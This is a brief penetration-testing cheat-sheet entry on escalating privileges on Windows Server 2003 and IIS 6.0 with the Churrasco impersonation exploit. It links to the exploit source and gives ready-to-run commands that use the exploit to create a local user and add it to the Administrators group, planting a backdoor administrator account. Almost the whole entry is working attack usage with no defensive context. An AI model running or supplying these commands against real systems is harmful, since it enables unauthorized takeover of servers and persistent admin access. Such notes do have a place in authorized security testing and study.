# Windows Server 2003 and IIS 6.0 privledge escalation using impersonation:

https://www.exploit-db.com/exploits/6705/ \
https://github.com/Re4son/Churrasco

```sh
$ c:\Inetpub>churrasco 
churrasco /churrasco/-->Usage: Churrasco.exe [-d] "command to run"

  c:\Inetpub>churrasco -d "net user /add <username> <password>"
  c:\Inetpub>churrasco -d "net localgroup administrators <username> /add"
```


